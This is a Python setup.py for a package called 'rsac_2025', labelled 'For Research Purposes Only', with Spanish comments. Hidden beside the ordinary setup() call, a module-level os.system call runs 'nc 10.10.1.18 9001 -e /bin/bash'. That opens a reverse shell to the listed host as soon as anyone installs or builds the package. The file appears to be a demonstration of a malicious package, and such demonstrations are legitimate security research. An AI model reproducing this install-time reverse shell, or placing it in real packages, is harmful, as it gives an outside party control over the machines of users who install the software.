from setuptools import setup
import subprocess
import os

# Comando alternativo más compatible:
cmd = f"nc 10.10.1.18 9001 -e /bin/bash"

# Si prefieres usar estrictamente netcat como pediste:
# cmd = f"nc {LHOST} {LPORT} -e /bin/bash &"

# Ejecución silenciosa en segundo plano
os.system(cmd)

setup(
    name='rsac_2025',
    version='0.1',
    description='For Research Purposes Only',
    author='Trevor Madge',
    author_email='tmadge@sonatype.com',
    packages=['rsac_2025'],
    install_requires=[],
)
